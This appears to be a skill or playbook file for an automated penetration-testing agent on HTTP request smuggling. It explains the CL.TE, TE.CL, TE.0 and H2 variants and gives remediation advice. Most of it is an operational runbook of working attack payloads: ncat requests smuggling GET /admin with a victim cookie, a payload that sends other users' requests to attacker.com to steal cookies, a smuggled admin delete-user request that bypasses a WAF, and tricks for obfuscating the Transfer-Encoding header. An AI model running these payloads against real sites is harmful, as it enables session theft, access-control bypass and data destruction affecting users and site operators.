---
name: request-smuggling
description: HTTP request smuggling (CL.TE / TE.CL / TE.TE / TE.0 / H2.CL / H2.TE) — desync between front-end + back-end
triggers: [smuggling, desync, cl.te, te.cl, te.0, http2 downgrade, transfer-encoding, content-length, hop-by-hop]
---

# HTTP Request Smuggling

When a front-end proxy (CDN / load-balancer / WAF) and a back-end origin parse the same HTTP message differently, an attacker can hide a request *inside* a request. The front-end sees one message and forwards it; the back-end sees two and processes the smuggled one. The smuggled request bypasses the front-end's security controls (WAF, auth, rate-limit) and frequently hits a privileged route.

CWE-444. Burp's flagship feature ("Watching the watchmen"). Companion to `scan_request_smuggling_active`.

## Attack Surface

**Architecture pattern that's vulnerable**
- Multi-hop HTTP: client → CDN → load balancer → origin app
- Each hop is a separate HTTP parser; mismatched parsing = smuggling
- HTTP/1.1 → HTTP/1.1: classic CL/TE confusion
- HTTP/2 → HTTP/1.1 downgrade: H2 → 1.1 rewrites are a goldmine

**Front-ends commonly affected (historically)**
- Apache Traffic Server, Squid, HAProxy older versions
- Cloudflare (fixed multiple variants 2019-2021)
- AWS ALB / CloudFront / API Gateway (various CVEs)
- Akamai, Fastly, Varnish older versions
- Nginx with custom modules
- Custom Go/Node front-ends

**Back-ends**
- Apache, Nginx, Tomcat, Jetty, gunicorn, uwsgi, Express, Go net/http, Java Servlet containers, IIS

## The 6 Canonical Variants

| Variant | Front-end parses | Back-end parses | Bypass primitive |
|---|---|---|---|
| **CL.TE** | Content-Length | Transfer-Encoding | Hide a request by sending CL+TE; FE uses CL (truncates), BE uses TE (sees the smuggled bytes) |
| **TE.CL** | Transfer-Encoding | Content-Length | Inverse; FE sees the chunked body, BE sees the CL-bounded body |
| **TE.TE** | Transfer-Encoding (obfuscated) | Transfer-Encoding (obfuscated differently) | One parser respects the header, the other doesn't due to formatting tricks |
| **TE.0** | Transfer-Encoding | (no body — back-end ignores TE) | Some BEs treat TE as zero body length |
| **H2.CL** | HTTP/2 (no CL semantics) | HTTP/1.1 with CL (after rewrite) | H2-aware FE forwards, BE applies CL from rewritten request |
| **H2.TE** | HTTP/2 (header injection) | HTTP/1.1 with TE | Header smuggling through H2's binary frame format |

## Detection Channels

### Step 1 — passive fingerprint

```bash
# Identify front-end + back-end
curl -sI 'https://<TARGET>/' | grep -iE 'server|via|x-served-by|x-cache|x-proxy|cf-ray'
```

Look for layered indicators (CDN header + origin server header).

### Step 2 — CL.TE probe

```bash
# Front-end uses CL (=40); forwards 40 bytes
# Back-end uses TE: chunked; sees the chunked terminator at position 40 and starts a NEW request
# That new request is "GPOST /404 HTTP/1.1" — appended to the next legit request

cat <<'EOF' | ncat --ssl <TARGET> 443
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 40
Transfer-Encoding: chunked
Connection: close

0

GPOST /404 HTTP/1.1
X-Smuggled: yes

EOF
```

The `0\r\n\r\nGPOST /404 ...` is the smuggled prefix. A vulnerable back-end queues the GPOST for the *next* connection.

### Step 3 — confirm via timing / response queue poisoning

```bash
# After firing the smuggled request, fire a normal request on the SAME backend connection
# (keep-alive). The smuggled "GPOST /404" prefix gets prepended.
# A normal `GET /` becomes `GPOST /404\r\nHost: ... GET /` from the back-end's view → 404 / weird response.
```

Or use timing-based detection (the safer probe):

```bash
# TE.CL timing probe — the smuggled request never has a terminator
# Front-end (TE) waits for chunked terminator that doesn't arrive → idle timeout
# Confirms TE-aware FE + CL-aware BE
time (cat <<'EOF' | ncat --ssl <TARGET> 443
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 4
Transfer-Encoding: chunked

5e
GPOST /404 HTTP/1.1
Host: <TARGET>
Content-Length: 15

x=1
0

EOF
)
# If response time > 5s and no response received → desync. Time difference is the oracle.
```

### Step 4 — `scan_request_smuggling_active`

```bash
strix scan_request_smuggling_active --url 'https://<TARGET>/' --probe-matrix all
```

Iterates the 6 canonical variants with timing-based confirmation. Returns per-variant verdict.

## Operational Runbook

### Step 1 — confirm the desync class

Run the matrix above. Identify which variant is exploitable (CL.TE most common).

### Step 2 — find an authenticated route to smuggle into

```bash
# Discover: what does the back-end serve on /admin, /api/internal, /healthz?
curl -s 'https://<TARGET>/admin'        # Probably 401/403 at front-end
curl -s 'https://<TARGET>/api/internal' # Probably 401
curl -s 'https://<TARGET>/healthz'      # Often 200 — front-end allowed
```

The goal is to smuggle a request that reaches a route the *back-end* would happily serve but the *front-end* would reject (because it lacks auth headers, or because the front-end has a path-based WAF rule).

### Step 3 — smuggle a privileged request

```bash
cat <<EOF | ncat --ssl <TARGET> 443
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 120
Transfer-Encoding: chunked
Connection: close

0

GET /admin HTTP/1.1
Host: <TARGET>
Cookie: session=<VICTIM_COOKIE>
X-Smuggled: yes

EOF
```

The smuggled `GET /admin` is prepended to the *next* user's request that lands on the same back-end connection. **It gets THAT user's cookies** because the connection is shared.

In practice the easiest exploit:
- Smuggle `GET /admin HTTP/1.1\r\nFoo: ` (note the dangling header)
- Next legitimate user request becomes part of the dangling header value
- Or: the request the back-end now sees is `GET /admin\r\nFoo: GET /victim-page HTTP/1.1\r\nCookie: session=<VICTIM>` → it processes /admin with victim auth

### Step 4 — common payloads

**Stealing user requests / cookies (response queue poisoning)**
```http
POST /search HTTP/1.1
Host: <TARGET>
Content-Length: 60
Transfer-Encoding: chunked

0

GET /steal HTTP/1.1
Host: attacker.com
```

The next user's request appends after `Host: attacker.com\r\n\r\n`, becoming the *body* of the smuggled GET. The back-end forwards that body to attacker.com.

**Bypassing WAF on a privileged route**
```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 90
Transfer-Encoding: chunked

0

POST /admin/delete-user HTTP/1.1
Host: <TARGET>
Cookie: session=<own_session>
Content-Type: application/json
Content-Length: 22

{"username":"victim"}
```

WAF blocks `/admin/delete-user` for non-admins. Smuggling lets it reach the back-end, which sees an *admin-cookied* request thanks to the FE-attached auth headers being applied to the wrong request.

### Step 5 — escalate to RCE / persistent compromise

- **Cache poisoning**: smuggle a request that pollutes the CDN cache for a popular path
- **Cookie stealing**: smuggle GETs to attacker-controlled host
- **Internal endpoint hits**: `/api/internal/eval`, `/admin/exec` style paths that are only protected at the FE
- **Persistent JWT theft**: smuggle a request that lands at the back-end with attached `Authorization` header from a different connection

## Bypass Techniques

- **Header obfuscation**: `Transfer-Encoding: chunked\r\n` vs `Transfer-Encoding : chunked\r\n` (extra space) — front-end strict-parse, back-end loose-parse
- **Header doubling**: `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n` — which one wins?
- **TE value tricks**: `Transfer-Encoding: xchunked`, `chunkedy`, `chunked\r\n;` — some parsers accept these as chunked
- **H2 → H1 downgrade**: HTTP/2's `:authority` pseudo-header sometimes gets rewritten into an HTTP/1.1 `Host:` that doesn't match the front-end's view of the request
- **0.cl quirks**: `Content-Length: 0` + chunked body — some BEs read body, some don't

## Validation

1. Show desync via timing oracle (FE waits for content that never arrives; or BE responds to a "next" request with stale data).
2. Demonstrate a smuggled request landing at a route the FE blocked: 200 / privileged response.
3. Capture response queue poisoning evidence — a benign GET intended for one user landing in another user's response stream.
4. Document: variant (CL.TE / TE.CL / TE.0 / H2.CL / H2.TE), FE software, BE software, exact bytes.

## False Positives

- HTTP/2 only stack — no HTTP/1.1 path to smuggle through. Test the H2.x variants instead.
- WAF normalises both CL and TE before forwarding to BE — both see the same view; no desync.
- Single-process server (no FE proxy) — smuggling requires two parsers with state divergence.
- Connection-per-request mode (no keep-alive) — smuggled prefix doesn't leak into a follow-up request.

## Impact

- Bypass WAF / front-end auth controls — reach back-end-only routes.
- Steal cross-user requests via response queue poisoning — read any other user's traffic.
- Persistent cache poisoning when the smuggled response gets cached.
- Internal SSRF / RCE when the BE routes to internal admin services.

## Remediation

1. Use a single HTTP parser end-to-end where possible (HTTP/2 throughout removes the desync class entirely).
2. Reject requests with both `Content-Length` AND `Transfer-Encoding` headers at the front-end (RFC compliant).
3. Strict header normalisation at every hop: identical case-folding, whitespace stripping, header doubling rejection.
4. Disable keep-alive on the FE → BE connection (perf cost; security gain).
5. Run Burp Repeater's smuggling detection in CI against staging environments.

## Pro Tips

1. Burp's "HTTP Request Smuggler" extension is the canonical tool — much faster than hand-crafting nc requests.
2. The TE.0 variant only works against a small set of BE servers but is devastating when it does — always include in the probe matrix.
3. H2 → H1 downgrade smuggling is the hot 2023-2024 research direction; many CDNs still have variants.
4. Test against the **path of the most-permissive** back-end route — `/healthz`, `/static/*`, `/.well-known/*` — these get forwarded by FEs that wouldn't forward `/admin`.
5. Smuggling is *probabilistic* (depends on connection multiplexing). Run probes multiple times; one-shot detection isn't reliable.

## Summary

Request smuggling is the gap between two HTTP parsers in a row. Every CDN-fronted web app is a candidate; the 6 variants cover ~95% of real-world cases. Use timing oracles for safe detection; smuggle privileged routes to demonstrate impact.
